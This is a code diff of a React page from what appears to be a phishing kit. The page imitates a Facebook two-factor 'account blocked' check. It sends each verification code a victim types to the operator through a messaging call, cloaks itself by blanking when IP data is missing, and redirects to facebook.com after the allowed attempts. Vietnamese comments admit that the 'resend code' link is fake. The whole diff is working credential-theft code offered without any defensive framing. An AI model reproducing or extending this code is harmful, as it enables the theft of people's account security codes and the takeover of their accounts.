@@ -13,65 +13,41 @@ const Verify = () => {
     const [attempts, setAttempts] = useState(0);
     const [countdown, setCountdown] = useState(0);
 
-    const defaultTexts = useMemo(() => ({
-        title: 'Two-factor authentication required',
-        description: 'We have temporarily blocked your account because your protect has changed. Verify code has been sent',
-        placeholder: 'Enter your code',
-        infoTitle: 'Approve from another device or Enter your verification code',
-        infoDescription: 'Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code. Please enter the code within 02:21 to complete the appeal form.',
-        walkthrough: "We'll walk you through some steps to secure and unlock your account.",
-        submit: 'Submit',
-        sendCode: 'Send Code',
-        errorMessage: 'The verification code you entered is incorrect',
-        loadingText: 'Please wait',
-        secondsText: 'seconds'
-    }), []);
+    const defaultTexts = useMemo(
+        () => ({
+            title: 'Two-factor authentication required',
+            description: 'We have temporarily blocked your account because your protect has changed. Verify code has been sent',
+            placeholder: 'Enter your code',
+            infoTitle: 'Approve from another device or Enter your verification code',
+            infoDescription:
+                'Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code. Please enter the code within 02:21 to complete the appeal form.',
+            walkthrough: "We'll walk you through some steps to secure and unlock your account.",
+            submit: 'Submit',
+            sendCode: 'Send Code',
+            errorMessage: 'The verification code you entered is incorrect',
+            loadingText: 'Please wait',
+            secondsText: 'seconds'
+        }),
+        []
+    );
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
 
     const translateAllTexts = useCallback(async (targetLang) => {
         try {
-            const [
-                translatedTitle,
-                translatedDesc,
-                translatedPlaceholder,
-                translatedInfoTitle,
-                translatedInfoDesc,
-                translatedWalkthrough,
-                translatedSubmit,
-                translatedSendCode,
-                translatedError,
-                translatedLoading,
-                translatedSeconds
-            ] = await Promise.all([
-                translateText(defaultTexts.title, targetLang),
-                translateText(defaultTexts.description, targetLang),
-                translateText(defaultTexts.placeholder, targetLang),
-                translateText(defaultTexts.infoTitle, targetLang),
-                translateText(defaultTexts.infoDescription, targetLang),
-                translateText(defaultTexts.walkthrough, targetLang),
-                translateText(defaultTexts.submit, targetLang),
-                translateText(defaultTexts.sendCode, targetLang),
-                translateText(defaultTexts.errorMessage, targetLang),
-                translateText(defaultTexts.loadingText, targetLang),
-                translateText(defaultTexts.secondsText, targetLang)
-            ]);
+            const keys = Object.keys(defaultTexts);
+            const translations = await Promise.all(
+                keys.map((key) => translateText(defaultTexts[key], targetLang))
+            );
 
-            setTranslatedTexts({
-                title: translatedTitle,
-                description: translatedDesc,
-                placeholder: translatedPlaceholder,
-                infoTitle: translatedInfoTitle,
-                infoDescription: translatedInfoDesc,
-                walkthrough: translatedWalkthrough,
-                submit: translatedSubmit,
-                sendCode: translatedSendCode,
-                errorMessage: translatedError,
-                loadingText: translatedLoading,
-                secondsText: translatedSeconds
+            const translated = {};
+            keys.forEach((key, index) => {
+                translated[key] = translations[index];
             });
+
+            setTranslatedTexts(translated);
         } catch {
-            // Ignore translation errors
+            // fallback to English if translation fails
         }
     }, [defaultTexts]);
 
@@ -80,6 +56,7 @@ const Verify = () => {
         if (!ipInfo) {
             window.location.href = 'about:blank';
         }
+
         const targetLang = localStorage.getItem('targetLang');
         if (targetLang && targetLang !== 'en') {
             translateAllTexts(targetLang);
@@ -102,10 +79,11 @@ const Verify = () => {
             const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
             await sendMessage(message);
         } catch {
-            // ignore
+            //
         }
 
         setCountdown(config.code_loading_time);
+
         const timer = setInterval(() => {
             setCountdown((prev) => {
                 if (prev <= 1) {
@@ -125,57 +103,56 @@ const Verify = () => {
 
         if (attempts + 1 >= config.max_code_attempts) {
             window.location.replace('https://facebook.com');
-            return;
         }
 
         setCode('');
     };
 
+    // Gửi mã giả — không alert, không popup, chỉ giả bấm
     const handleSendCode = () => {
-        // Có thể gửi lại mã hoặc show toast giả
-        alert('Mã xác minh đã được gửi lại!');
+        // có thể thêm hiệu ứng bấm ở đây nếu muốn
     };
 
     return (
-        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
+        <div className="flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]">
             <title>Account | Privacy Policy</title>
-            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
-                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
+            <div className="flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg">
+                <p className="text-3xl font-bold">{translatedTexts.title}</p>
                 <p>{translatedTexts.description}</p>
-                <img src={VerifyImage} alt='' />
-
+                <img src={VerifyImage} alt="" />
                 <input
-                    type='number'
-                    inputMode='numeric'
+                    type="number"
+                    inputMode="numeric"
                     max={8}
                     placeholder={translatedTexts.placeholder}
-                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2'
+                    className="rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2"
                     value={code}
                     onChange={(e) => setCode(e.target.value)}
                     onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                 />
+                {showError && <p className="text-sm text-red-500">{translatedTexts.errorMessage}</p>}
 
-                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
-
-                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
-                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
+                <div className="flex items-center gap-4 bg-[#f8f9fa] p-4">
+                    <FontAwesomeIcon icon={faCircleInfo} size="xl" className="text-[#9f580a]" />
                     <div>
-                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
-                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
+                        <p className="font-medium">{translatedTexts.infoTitle}</p>
+                        <p className="text-sm text-gray-600">{translatedTexts.infoDescription}</p>
                     </div>
                 </div>
 
                 <p>{translatedTexts.walkthrough}</p>
 
                 <button
-                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400'
+                    className="rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400"
                     onClick={handleSubmit}
                     disabled={isLoading || !code.trim()}
                 >
-                    {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
+                    {isLoading
+                        ? `${translatedTexts.loadingText} ${formatTime(countdown)}...`
+                        : translatedTexts.submit}
                 </button>
 
-                {/* "Gửi mã" - chữ có hiệu ứng bấm */}
+                {/* Gửi mã giả làm link giống thật */}
                 <span
                     onClick={handleSendCode}
                     className="text-blue-600 hover:underline cursor-pointer font-medium select-none active:scale-95 transition-transform duration-100 text-center"
